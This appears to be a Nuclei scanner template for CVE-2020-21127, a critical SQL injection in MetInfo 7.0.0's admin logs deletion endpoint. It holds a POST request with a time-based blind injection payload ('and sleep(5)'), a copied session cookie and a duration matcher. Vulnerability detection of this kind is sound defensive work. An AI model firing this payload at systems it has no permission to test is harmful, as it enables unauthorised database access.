id: CVE-2020-21127

info:
  name: MetInfo 7.0.0 SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  description: MetInfo 7.0.0 contains a SQL injection vulnerability via admin/?n=logs&c=index&a=dodel.
  impact: |
    Successful exploitation could lead to unauthorized access to sensitive data.
  remediation: |
    Upgrade MetInfo to a non-vulnerable version.
  reference:
    - https://github.com/T3qui1a/metinfo_sqlinjection/issues/1
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-21127
    cwe-id: CWE-89
    epss-score: 0.00206
    epss-percentile: 0.59306
    cpe: cpe:2.3:a:metinfo:metinfo:7.0.0:-:*:*:*:*:*:*
  metadata:
    vendor: metinfo
    product: metinfo

http:
  - method: POST
    path:
      - "{{BaseURL}}/MetInfo7.0.0/admin/?n=logs&c=index&a=dodel"

    headers:
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0"
      Accept: "application/json, text/javascript, */*; q=0.01"
      Accept-Language: "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"
      Accept-Encoding: "gzip, deflate"
      Content-Type: "application/x-www-form-urlencoded; charset=UTF-8"
      X-Requested-With: "XMLHttpRequest"
      Connection: "close"
      Referer: "http://localhost/MetInfo7.0.0/admin/"
      Cookie: "PHPSESSID=01b80466de9751fc3c1cfc72f0950804; Hm_lvt_520556228c0113270c0c772027905838=1575270458; Hm_lpvt_520556228c0113270c0c772027905838=1575288807; admin_lang=cn; arrlanguage=metinfo; re_url=http%3A%2F%2Flocalhost%2FMetInfo7.0.0%2Fadmin%2F; met_auth=a5ccEpa7pIj9%2Bu1jgKVK%2FoV%2F4ng%2FZE4q1NHoa6WWp04qmc3I2NaeVmyVxLjrxEyfOGQU%2FJ2nMcC8WlNiLixs9tGPsw; met_key=AneTFuY; page_iframe_url=http%3A%2F%2Flocalhost%2FMetInfo7.0.0%2Findex.php%3Flang%3Dcn%26pageset%3D1"

    body: "id[0]=123 and sleep(5)"
    matchers:
      - type: dsl
        dsl:
          - "duration>=5"
